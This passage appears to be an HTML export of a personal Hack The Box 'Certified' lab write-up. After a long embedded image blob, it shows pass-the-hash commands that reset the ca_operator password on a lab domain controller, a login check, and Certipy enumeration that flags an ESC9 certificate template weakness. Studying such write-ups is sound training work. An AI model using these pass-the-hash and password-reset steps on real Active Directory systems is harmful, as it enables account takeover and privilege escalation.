wXl4jrse5ydi4oP4A349wP//bdv3ecEiDe75Ds7X50a5SCZhU8vdshHjr3de4zWnDrj8jV5/ncd3ZkptaDFLdrXpD5c4Wro14q1YS8bc3xPOn3JxE2p3WuJJSyBx73G+PqNmTfQNqMkGMxuLOzepzvvuvjvLy3Jz/wdvqGH0M1v53NQ+8BkVFwSb4Ds2qhYzBxKhV52/Sn/whpoJwD3oBw+pVMCPv0PjU6qdyr3+Zy+pdjkZMd73XlW5CxO3sE9fuHOWk+fVlAlu9/NF3jPHNTZaNco3TUfa9886uHxD5UO4FW6ZSxaUg6irVSpr8YdvqhiD747DjNPTUwj4bbndRq/spcPH72yswe/PojyVw+EsCmcwOCNxtVpldTicc9jVzbZ3qg7+zWtVsDRp7OyRnUFDo2oSCHfhH/xS/SD4HebskM2u1qvlHw2nRzhGio5SU2L4+SbO6txzjxeuqZ/X6mUqaLlnMdz54XwOt/hD0y2+OqHCAI48X9+rdsbgeodjoaOn1M80K12N3eKc0pxSRjNxouz7r6kQlDMz/DmnsMJyC+HCHUjcq5eTnd3Y2DQxMckt++3bt5WVl3LNxM19rsOrq2tHhke4qisrK+Hwg3t9uOLiT/i1ixar9W1zcnMyMjP2v7j/xo0b3V09doe9oqKC+5z8Pr/qW51erHbr1q02m5UrdT6O1aLV1NRyrn/16lUrVq7gmo9T2BzJhMZbc5/ijh3bSdVnsXv2vJBhdNBu3rLZoql+OAKAeXE4ndGhrTO5QuyXxLV2ypwrfv9tr/fMVKDV57vm9t/wzD7SIDPSWB9hXWSzrY2wZs194I2q+kkYtTmXP9HR0dx6Nr/Dxcuq1at6ensPHfryypWrXJ5w2VJRUcZd+9wg5h68kpKiKGN1CqfTwUUTl0LNzc1cXs08PL+quKho67atF85f+OW//bs5IYELwG8cJjRzngapJarSZ0YCnIvgArOivPzSxUtZWZlNTU0Z/Iz0NLPQy87JSs/IuHLlytDgUOJ9qWMOITZu3DDQP/Dhhx8lxMd7fT7OV2zZsonLTP+MVdL5FIUFBZy+4FOUlhRzGc5dOUuWLuUenDOnz/b19nnc7u6uLu7l4fCDu/C5a4lz2q1tbYcPH7lxo4pfznfK5TO/IV3d3TPnaZAR7axatXLmufLy85avWHbxwkXukyowZqQ8ppnzNPit5tCuqHgxh0nV1dX/8Pf/w+v18uVxCPTKyy/y5/zT8fr8r7zyEs3L4MDAgQMfcmjHbyAnwfhNW1y0mL5dLL/4xS9oIYxNqPbTyKixrbe/VvhvGIUNd0eTvkxQMl/aHEocOaW7D45N/D9D3kMTgSYfeWkOAqR3B/xXPb6LU9IjLUV2EaPNbXX8fql9LUXz9HhNy1LdvpO0+OAxhDHBwGjjen2qxW9Od+bHW1rVYKfoSJXN4C523/TfKbc7ubHOMcDoGHV0qTa9OZi+q0c9UteojsCdQdzYbbn7VZrxquERdWSOK+x2FWZw0u/MJdVi5tcKY/40Zyz5mebH0IhqbvLxG5uDDXFuu5+/ohacNRfh5QvjIIc/5+fMfCE309UL3dR4Ww214h53XVch08Cg2nqCvxW6MP4p1zUFG9Nrl6tO+o1rVJxgfnA8c61WJXn4UvmCJybo9CUVS4Qa35yZ4RjjzEWVRjDxlfD7xm8mvwkBv1p968hJFZPwRS6rUNd20zid0NRYKX6X+Eo48Dh3Wb2KL7K7lwaH1GAq/uC7OHZaLaRrBmwq8zPjHvk95KCFv8U/Ar4jPiP/4EbHVUTE75U5JV0Y64PxO+CdDjUnJ9UlqYFegnr71HoAE5N3/b7wl3yFQ8YT1Bn1O2fkJ3PMw9GXubYVH4RTYRz+8ZM5hcWBEN8mp1b4pByAtXZSaLIZP8IpGv5JmY+Yu4Xw70loh0dhDHJTY/aEegM5Njtx7s5GH3k5auRbXAw9ZZw95y6i0JLQXLJz2porRe4F5H/5czOTzt1UnMSoqCjnCqaisoLTzfxIdnZWbm6u+QTuTyosLODOLf7L5ZCguLiIs+18BK7X7XYbBy3cvxhKrOfn53FMwvWHOmyqOuzKlSuKS4pjY2OSk5P5ODNT8HzAXE7S5+Xyg4sWLzJX4M3jR4wjmE+wGAgAZo1bqNytfvNmndqOhqODeCErBWXMLdLw1Xom/3HE/ZtR78lJvcWvxl/N4cWkt/u53udkCDcDtBybFje3v2LRI7UzUtxWn3Njmrsqtm3bFprewF0n3IK3aBaPx8PpiCVLKjdv2RQdHRMI+BctWhRqTXJD2W53cPEy5hr7+tjXly5duXxZfVy9em1iYpwTC+kZ6Vymeb0e7h/hvOu2bVsXL17ExQ4XmwkJcSUlJdF3r8HNj3NxxAWjnMYhUJ5RgnE4UVRcxBELl7T8pTPSySUnpzgqKytCo4DUd52OiIhILvT4svnlXK6WlBbzQcyrjY+P45KZz+P3B+IT4tesXbNp80bzu9z/kpqWxlHHnVM4nVzY+nxe/kGvXr0y2ZjOzoU5l7ccjHG3TlFREZfAfMEcd2VlZVktVo/HzdFXeXnZtu1b1SYe6nY0fnLodiIjo/h2+D3h0ptjAD4Xv+d8kY4IJ8dsaskBVYlr/Fq+7OmSWfKVcECSpfqbJP9oSstK7hpqJdVYtfz8/MysDE0T/BPhF5qn4+w3Jy7y8vL4Eb5irkD5Z82XvX3HNq5ofD4/p8GdDge/XVyPxURHc6LjzpGNN5/vJfQId5llZ2cXFORPn1bypfK7zSfiHD7/dHbs3JE13SnG37JaFywfEEZCyqe92oyJ244//Es1FVhdhPsdMfk3IqDGqstE8v9ck7s0tev27Ez+ZjTQ4nV/Ms6lxuPO8XCS89UYS64t4nuxltn3cFzXrf89IGpJGCkvGfET3fkX0pKOvbzux73yS8vumtfO+QRul4drJNLyStq/Q/1ecTPa3ACbAzmPj7DbwaNt3UD/9/+pdlV/yriRwR1Fuv48rgIRxFW+mtv6ragPAJ4a7r599533/vl//ktfn8pW60UU+FOL3DnbhLg+4Peen3IfGPMcmZhb3+KDaJlW25YIx44ox84oLXp21+AncVm3/GNAq1JfcR/Ej378wz/+L3807yVKGxuaOBEhp3fk4ONwmMF5XXrOcSPzVtOtTz/9jHMRu3btTDU6a7yGmRMh4H5mxEjPvwWrHVOS1Af3o/sDHNNxP0Ycpwa49BCjJFql9Kjkxmx4zk5O/sNw4FaYGpJucr+rev61GM353dhZ9nCIbikGg2EGiWhpyZbi2/DL8SRwtoQ/nhxOp/DvVVG+GgRlJmG43/nUedXfv0AxNTwK16bcTJfP+c8GCQ2AuYqKiuI+Zs43mpGG4Iq3S8oJOZtORn1C95ycnPjb4UD9YwcZ5gG7/J53xvxX3OSTEW/NbsXqSSnaJU0vSsdd19yhzu3Cb1zV9GGKihfzB33rcF9Mdk7O1q1bzp079/nnXzgjItQ+GxYLZwnWrl1N8HtgwSINrppLi+h6jRrjQVo2WXIp0KZa+gGONIhGOZf6zTuG+mrck/80EugK93ZjkvMkLpFldWyP0iK/6SK4uLktaXpKg9SyyLKYjEiDY9H8HLVrgLLL6wAAEABJREFUNTxNLpfaN337Rkow6gvXhBoylBCnFp6Ch9mxgWLmOxfzcZhDjwgAfs84HI70tPSUlJSbZKxqwp2MjVLN1phFpOGvck/9cjRcYUZIoNE39e+jliyrfX3kNz/bReKWFMZ8Qi7H4uPj+Xa4NMOC1/fj92TlqhVp6am1NTdHR9WI3oiIiMSEeLxXj/at2cJvITP+S8vU7m8caUgtXVpLyXdJGJPCVcOdP9L5l/FRJY7n64mpd1y+M5M0Ff4O0UCdd+qfR+So7twfrcU/siXUIUXdndUnyJIvtRwhHHxN61bQf/srFWzAwiovIXg0p51mvXg6AEAYJCTE5xpzsdxut5giThGIbpL5j3yNLn3VHu5h9F147DX4HoQPPv43Q1E/1R07ox+1LA13iQ5I0UbCCHYiIyO5hz4jI8OYdIGS9AH4bSk2EPz+WdBIo1zNcCW1AUUkWYtJi6UAB7tS9JBWI9W88Eeu7DL1a5fnq4m5zQCbC985t94fsC11PDrSEM1S4+ImuKK2U1oXqxsxZpSvXqrWC4pdiK5iAACAZ1lCYmJZRVnKiZT2tnb19QBRk6QKSbEPbeP7m72T/zri+XKCnpAp6Ts95U6x2lZHPGr49LikBkntweYHh0zllWUZ92yWBACGhUzN5GSoHdYcRvwvLUWkFUq1u7ZqtYtanTol+R4aRfjbvIFm75MLM0yBW75Am196H36WQalVS5pe3kdasslaSULFFlERar3XmNnNNgEAAPi9EhMTzZ3cuTnBvL8YIq1KUsdDK1wZkL6rHtXD+ESHwurku+H2HH5kMGNU/cJYuy+4zFFx8cN2DgH4PbeQkQbnGDesVts7kJrekCNtq4QINsy1RhLXZgxJuodO7t+4At3hnp7xIFMH+EQPnW4ubkrBJeN0iaTGgHFyxpikUVpEedkYkQIAAPAA3EbPyMgwVgVV7QDVydgiRT1XqQ8ONvwNXs/hcTn0xKfcBZp83jNTD/32hBSNxofRNIiOiS4tL83LzycAeJAFnm6ydb3a9lhtRK1FSdsyaclVW/iR2i5Uu2ykJh+U1tAnAp5jk3L4aczw9X4xodIagQcVfANSXNZF5/TitiKZLCukSDQ3Hdy4hh57y0gAAIBvrZTk5JWrVubm5ppfij7SLj00reGv8niPTtJTIcf0wMBDejP71UWK6W1P01JTV61cmZGBoVMAD7bAkcbifKooUfuvKdZyaVstQ2mNWiku3EkXzOSv98rxp7WQUIACXT55/zCtAIkbUoVDoSu0LZH2VWRcf3yc2qIuHktFAwAAPEREZERJaXFlZWWUsV+4mCRRJ8V1SaMPCDakW5cTT2lFbH+T13v2QWmNMSmqdVElhfFNvuyy8rLKJRXmftIAcL8FjjSsVnppFyUlGF9oSdK2gSx5wbTGMGlndLop75+M4T0+qQ8H6GnxX3PL0ftO1yG1U7poJ2H0ekiRIu3ryZpjXvymNbQon7CAGwAAwCNkZGSs37g+f3r0kUprnJNqavjTq+QfQO/wcQrl3kd9kpqldlqK9uAD6enpGzduCOVkAOB+C79Y7/rVtKKSnGZ3gG2ptG0iCq7WpDWQdkxXiVT/nWBD+qTv0hRnNulpUYHNQIBmxjvDUpzWtStSGAkNITSyrZTWdUQqi5GcRK/sptRkAgAAgEeIjo5etmzJqtUrY+PUFkjCrUY0cGueeu7qZNQndd319Op96ZaST3dPP+egioI45WIubhsTE7N8+bJVq1aaCRkAeKCFjzRio+n1/Wq2hqIlk32btFZIoSIPzk5qZ7lNbyzuNP0HLz1SH9LpacwGDwrc9nMBd2cbY4+ara4d19XmoMZjUsuW9u1kKTATGts30PLK6SFhAAAA8HCc1tiydXNJSYm5VZka0XBWF2d17tQLPUe6AnLgKaY5/KSPBPSZwxlcUlyS2impGfuCW63WRYsKt+/YlpuXRwDwcM/EBoQbVqv501HGAnHSWkaO3aRlEamlrLUesnyl8583TYZCDVoAnDMNdaY0SO0LXasLbtkjKUa3bZe2taSpVExGKr30AhIaAAAAsxIZGbl06dJt27emm/OqdRIdpH0txVWpdq4w+elRK84/AXJc10OxzYRKZWiHddESvIbk5KStW7esXbsmAt2KAI/0TEQanNb40dtqL23VnSFidE5r2DdJ7c6Kt9onOnGJY+4FbiPrCoeIFvS0qNMlWYJvVYu0fBZQ604EF8DQ1Igv5wvSksGf26z0yl5aVh7cJAQAAAC+UUpK8vbt2zZu3BA3cwwVt+xrg1W/iNG0JAs9NU6hpVhEnFHx8wXUS+2IrlVJc5femJiYVatX79y1IyMzgwDgkRZyj/CZlpfTvp3U1UvDI5zMyJOOl0nvEJ6zRG4KkHZDUoQesGq0nDSnFvmjOOHQfFfd5H7iPRyWPKvjrRhrgU1ogm5L7WNdOyHFWPC70lKgO18my1Ih1H7mS8rUDI1kLG4LAAAwa1artbCwYM+e3T3d3RcuXPJ6vVzPahclOXTdpsky0uIs9o0RvpoovePJD57WyLLI5nwr1pJiVWFGg9S+lOKcFC71TYfDUVZWtn//3uKSYgKAb/KsRBqczXhrP1XfpOPnyO3mFnylsL9B+hj5b3DGVE3YuCRJ0wO6RivIVuEUP7P66z3BLMeTZCm0WfNswqapFSc+0bWjOg1Mj+DSssjxquAMjKb6YDjA+IPXqaiALE+x2wUAAOBbIDo6eu26NYODg0NDw3V19bquq521TksS/KkmS8m2whn914mB1qcSaeTYbGUONWybsxmHpHZC1wbVdzgiKijI37d/z/oN6/mCCQC+ybMSabC8HPrx2yqtcbOB/BQp7Rt1OSp0t9AbVLAxTtp5SR5d92hyBVlTrdb0p3XxHM/c1C2/08VJKfq40FOPSS1NOvZJxx4SyZzXddjpjRdp52aKQckDAAAwd4mJiTt37hgZGZmYmGxtbSVzdvhJST5d36PRUmErc9rK6CkZk1SlRnBpZ6U2oB6wWCxZWVn79u/bu29PamoKAcAsWH7xi1/QMyMnk6Sk2gYan+ACJlJoKSRIBnqFWnxKFz610rboktJqLIQbxZf/5GdrDKl5YJYDulpxYpCEudiUSJWO3dL5OlmLSKg5GRxj/PmPKC9b7XcOAAAA8xAVFZWWmspZjM6uLpdLDVcSblX107CxTEycoChBT7qeDRANqr2DLZ/p2gWpDanHNE3LyMx48eX9b731ZkFBPgHA7DxbkYamqXnhbg81ttDUFH8dQ1qaSmTKASE52AiIAIleFWyQm6RdUCyR7YkVOl6iVilO6trvpJoCHpqboaVLxy5yvEG2chJq0YkVS+jnf0SVpdiqDwAAYP6EENEx0alpKfxJT0/P2NgY9z8KD4l+Ej1c9UsZQcQVr+OJRRuTxvZ8x6Tld7pWTZpR9Vut1qzszJde2v/d7729ePEigT5FgFl7tiIN5nTQojwadVFLG3m4ra/FkiVdkJ30YZLDwtg1lNOp1GUUOtIY/8XJDWtY/+z5sL1G2vQz3XJUag0kQluFWrLJvpecr0tbhRlmlC6mn/2ENq+lyAgCAACAx8HZg7i4uMyMDJvNNjAw4Bob0wO68KuN80S7CjnUovPc1egMd9XvkdRN4oq0HNI50tCaSfjUw3aHvaAw/+WXX3r77e8sQpgBMEfPXKTBoqMoP5eGR6m1g7xGsCG0TPWvHKfAgCD1py8mSesk0SbF9PZ55DAKnccsAfjYfcZCExxgfCEtnDadnphBwiati3THq9LxKllLzDCjqID+7Ie0ZxvFxhAAAAA8PjPYyMnNiYqKHh3lWGNMrUbFyY1xEl1G1T8gSRdq9Xm7MbThMbmNGKNKLWVr+VLXbpA5/5uM0VwVFRWvvvrKq6+9WlhYgDADYK6exUiDJcRRbpbKabR3qaWo1KZ4Wpa0ZJL0kj4uaEr1aegquaF6OJolFz3qMa8RdTjmPn+DXzUqiQ9VyzlTXS00cU5qt4N78ykiXlqX6s7vkWMfWfPNuRlLyumPv6/26YuPJQAAAAgXDjZiY2Nzc3MS4uN9Pv/oqJomzo+rGZuc3GgjaiXRrYZSk7kYFWc55rrwo0/SCFGbsSvfUd1yWBeXSesIVv0cVCQlJa5fv/71N1/fu2d3dk42AcDcCSkXZM/tWWlpo19/SO9/Qv1DaqY4SY/0NwjvEeE7Jfw3hZwMPVNGkEwnmSFkEckSQSlCxhqzOCLV/jsP3p/QYywqNUb8IYaNcZl1UnQQdaopGSK0I7iwSw5ybOvIvlvaVpEWpx4TtHIJ/ckPaOcmLDYFAADwpLhcrprq2qNHj508caqtrW18fDz0LRlJMotktpCLhVwkZIoxZTzaqPodD6r6uWb3SpogGldLS4l+KW5J0chdllL0UGg2Jhnblufl5W7YuGHP3t3l5WXx8fEEAPPyTEcarKeP3jlIBz6j2+3kDxgP6V3kvS68Xwl/tdBbVZZjBhlHMpkoSZU4KvZIExRvjOa0GfuhC6Og8RujpEaJuJTpVuOvuIOEBqQYIjFjnW7uz9BFOlmKpX2ntK8hSyEJTpeo/b83raUffoc2raHoSAIAAIAnx+v1dnf3XLxw8etjx2/cuNHT0+tWox2CpEVV/ZRMMtEINjKNf7nqdxgzOc14QzdWlOIXuYzV6jkZwv8OSRogbcT41jS7w56enl5ZWbFt29b169fl5OZYrc/QfgAAz51nPdJgrnH64hi99wldqaJg2SI9FGgRvmvCe0LoTeRvN8qPu3HRE60+gn0bNgrmVc1Iw2OMy5xQfRh3ZnvfYZVaKmk5ZN+o29aQtVxNTDemgKQm0+4t9AdvUHmJCjkAAADgKeBsRnNzy5XLl0+fOltfX9/b2zelFqm8i7SpRfBlFFf9wpjCMaPq9wXHMggjpyG89x7f4XBwjLG4aNH69evXrltTWFgQFxdHAPB4noNIgwUCdOYiHfySjp6i/kHSzaFNcowCreSr1XznSb9FgW6hD00P2JwnKWJJS5WWHFIBxlJpKSJLkllQWSxqHduXdtGreykrXS3ICwAAAE+Ty+VqarpVdaOaUxy3bt3i/MbIyEggEKD5slgscXGxaenphYWFq1evXLZsWUFhQVJSIgFAODwfkYbpdjt9eZwOfU3XaiiUOJX6hNA7hd4ufTc0fy0FekkOCTlCahbHrG5NCgdxgCESSEuS1sVkXS4tBdKSK7SE6bQrpaeqEVMv7qLNa9TSWAAAALBQOL9x+3ZrS3NLTU1NfV1DT2/v8NDQ8PCI2+2eTatGCOF0OuPj4xISE9PS0kpKiisryznSyM7JxpQMgPB6niINUoM16fxV+uoEXbhKDc3kmTnwSe+nQI/Qeylwm/QWEeiW0kVyij+EmsvhFxRcrVYNjhI2tUaVFkkUJbVkqeWTtYDUWrqpZMkwl5Yycb/GkhLauoH27aDsDJXZAAAAgAXn9XqHBoe6u7u7urpb21TgwSmO8bHxyVlocE0AAAMdSURBVMlJDjl8zO/XAwGOK4SmWS0Wu93ucDgiIyNjYmNSU1MLCwvy8vMyDMnJSfxdAoBwe84iDVP/IF2tVsEGJzdqG8g1RnfdhBwjfYgCI2pVKTku9HE1JFNOCvKprUbJQsIpRRSJaLUHOcVIjRMaiWSJp7tXyMvLVsOlVlTSupVUVkQRTgIAAIBnTSAQGBsbGxoaGhkZ5U8mxsfHxjjtMT415fb71R5cVquVkxgxhsioyNiYGM5dJCYl8pcW9CACPEnPZaRhGp+kqpt0+bqKN6rqqKd3enGqewWk7hHkJxFQQ6WkRQqLSmiotMYDcESxuIDKi2n1Ulq7Qm3rgW4OAACA54jf7/cq3MOohjNwUsNms3JCAwtJATxlz3GkYQoEqLFFLUt1vZY6OqlvUGU8hkZoTtPDOLpITFDrSqWlUHEhLa+gVUvUI5j2DQAAAAAwP899pBHSN0CdPdTdG/zoH6LBIfXv8AhNudV2414fd3KQ3UZOh1qgNjKSkhIoJUn9ywFGeiplpKlFpfKy1RMAAAAAAOBxfHsijZl8Phocpu4+tfEffzI5RW6Pmj7OjzscKpDgj9gYFWZwgMEfsdFIXwAAAAAAhNO3M9IAAAAAAICFhalRAAAAAAAQfog0AAAAAAAg/BBpAAAAAABA+CHSAAAAAACA8EOkAQAAAAAA4YdIAwAAAAAAwg+RBgAAAAAAhB8iDQAAAAAACD9EGgAAAAAAEH6INAAAAAAAIPwQaQAAAAAAQPgh0gAAAAAAgPBDpAEAAAAAAOGHSAMAAAAAAMIPkQYAAAAAAIQfIg0AAAAAAAg/RBoAAAAAABB+iDQAAAAAACD8EGkAAAAAAED4IdIAAAAAAIDwQ6QBAAAAAADhh0gDAAAAAADCD5EGAAAAAACEHyINAAAAAAAIP0QaAAAAAAAQfog0AAAAAAAg/BBpAAAAAABA+CHSAAAAAACA8EOkAQAAAAAA4YdIAwAAAAAAwg+RBgAAAAAAhB8iDQAAAAAACD9EGgAAAAAAEH6INAAAAAAAIPwQaQAAAAAAQPgh0gAAAAAAgPD7/wEAAP///0KS3wAAAAZJREFUAwCFAwE6sbR7zQAAAABJRU5ErkJggg==" alt="c24b2bc0e2fc049509d1cad67f85bf8e.png"/></p>
+<p>We can change the password of <code class="inline-code">ca_operator</code> using PTH as we don&apos;t have their plaintext password:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ pth-net rpc password &quot;ca_operator&quot; &quot;newP@ssword2022&quot; -U &quot;certified.htb&quot;/&quot;management_svc&quot;%&quot;ffffffffffffffffffffffffffffffff&quot;:&quot;a091c1832bcdd4677c28b5a6a1295584&quot; -S &quot;10.129.231.186&quot;  
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+                                                                                                                               
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ nxc smb certified.htb -u ca_operator -p &apos;newP@ssword2022&apos;                                       
+SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.186  445    DC01             [+] certified.htb\ca_operator:newP@ssword2022</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Certified]
+&boxur;&boxh;$ pth-net rpc password <span class="hljs-string">&quot;ca_operator&quot;</span> <span class="hljs-string">&quot;newP@ssword2022&quot;</span> -U <span class="hljs-string">&quot;certified.htb&quot;</span>/<span class="hljs-string">&quot;management_svc&quot;</span>%<span class="hljs-string">&quot;ffffffffffffffffffffffffffffffff&quot;</span>:<span class="hljs-string">&quot;a091c1832bcdd4677c28b5a6a1295584&quot;</span> -S <span class="hljs-string">&quot;10.129.231.186&quot;</span>  
+E_md4hash wrapper called.
+<span class="hljs-built_in">HASH</span> PASS: Substituting user supplied NTLM <span class="hljs-built_in">HASH</span>...
+                                                                                                                               
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Certified]
+&boxur;&boxh;$ nxc smb certified.htb -u ca_operator -p <span class="hljs-string">&apos;newP@ssword2022&apos;</span>                                       
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span>  <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (<span class="hljs-built_in">domain</span>:certified.htb) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span>  <span class="hljs-number">445</span>    DC01             [+] certified.htb\ca_operator:newP@ssword2022</code></pre></div>
+<p>When checking for any certificate vulnerabilities, it mentions <code class="inline-code">ESC9</code> could be possible:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad find -u ca_operator -p &apos;newP@ssword2022&apos; -dc-ip 10.129.231.186 -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;certified-DC01-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;certified-DC01-CA&apos;
+[*] Checking web enrollment for CA &apos;certified-DC01-CA&apos; @ &apos;DC01.certified.htb&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : certified-DC01-CA
+    DNS Name                            : DC01.certified.htb
+    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CERTIFIED.HTB\Administrators
+      Access Rights
+        ManageCa                        : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        ManageCertificates              : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Enroll                          : CERTIFIED.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CertifiedAuthentication
+    Display Name                        : Certified Authentication
+    Certificate Authorities             : certified-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+                                          NoSecurityExtension
+    Extended Key Usage                  : Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-05-13T15:48:52+00:00
+    Template Last Modified              : 2024-05-13T15:55:20+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\operator ca
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Full Control Principals         : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
+    [!] Vulnerabilities
+      ESC9                              : Template has no security extension.
+    [*] Remarks
+      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad find -u ca_operator -p &apos;newP@ssword2022&apos; -dc-ip 10.129.231.186 -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;certified-DC01-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;certified-DC01-CA&apos;
+[*] Checking web enrollment for CA &apos;certified-DC01-CA&apos; @ &apos;DC01.certified.htb&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : certified-DC01-CA
+    DNS Name                            : DC01.certified.htb
+    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CERTIFIED.HTB\Administrators
+      Access Rights
+        ManageCa                        : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        ManageCertificates              : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Enroll                          : CERTIFIED.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CertifiedAuthentication
+    Display Name                        : Certified Authentication
+    Certificate Authorities             : certified-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+                                          NoSecurityExtension
+    Extended Key Usage                  : Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-05-13T15:48:52+00:00
+    Template Last Modified              : 2024-05-13T15:55:20+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\operator ca
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Full Control Principals         : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
